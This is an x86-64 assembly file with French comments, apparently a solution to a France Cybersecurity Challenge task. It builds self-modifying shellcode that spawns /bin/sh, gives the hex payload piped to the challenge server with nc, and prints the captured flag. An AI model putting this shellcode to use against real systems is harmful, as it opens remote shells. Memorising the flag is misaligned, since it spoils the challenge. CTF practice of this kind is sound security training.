bits 64

%define SIZE 0x33

lea rdi, [rsp+0x45] ; rdi = debut shellcode

; reconstruire le jnz loop
mov BYTE [rdi+0x19], 0x75
mov BYTE [rdi+0x1a], 0xf6

add rdi, SIZE ; taille shellcode

loop:
    mov BYTE [rdi+rax], 0x90
    inc al
    cmp al, SIZE
    ;jnz loop
    nop
    nop

; execve /bin/sh
mov rax, "/bin/sh"
push rax
mov rdi, rsp

push rbx
push rdi
mov rsi, rsp

mov rax, 59
    

; recopier les bytes
; mais avant d'executer cette partie, la xor pour la faire devenir des NOP

; ----------------------
;
; nasm -f bin shellcode.asm -o shellcode && xxd -p shellcode > shellcode.hex && python3 disass.py shellcode.hex
;
; (echo '4889e74883c745c6472075c64721f14883c73d8a1c0780f390301c07fec03c3d909048b82f62696e2f736800504889e74831db53574889e6b83b0000000000003bb8e689485753db3148e78948500068732f6e69622fb84890903d3cc0fe071c3090f380071c8a3dc78348f12147c6752047c645c78348e78948'; cat -) | nc challenges.france-cybersecurity-challenge.fr 2054
;
; FCSC{662c7ce1f85b5bb4a874a9ecddae4ea9b24d5ef0ce72c28df162ee8311b19ec3}
